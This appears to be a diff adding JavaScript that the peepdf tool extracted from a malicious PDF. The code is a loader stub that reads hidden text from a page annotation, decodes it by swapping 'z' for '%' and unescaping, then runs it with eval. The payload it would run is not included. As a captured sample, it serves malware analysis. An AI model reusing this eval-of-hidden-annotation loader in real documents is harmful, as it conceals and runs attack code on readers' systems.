@@ -1,0 +1,18 @@
+// peepdf comment: Javascript code located in object 8 (version 0)
+
+var z;
+var y;
+z = y = app.doc;
+y = 0;
+z.syncAnnotScan();
+y = z;
+var p = y.getAnnots({
+    nPage: 0
+});
+var s = p[0].subject;
+var l = s.replace(/z/g, '%');
+s = unescape(l);
+eval(s);
+s = '';
+z = 1;
+
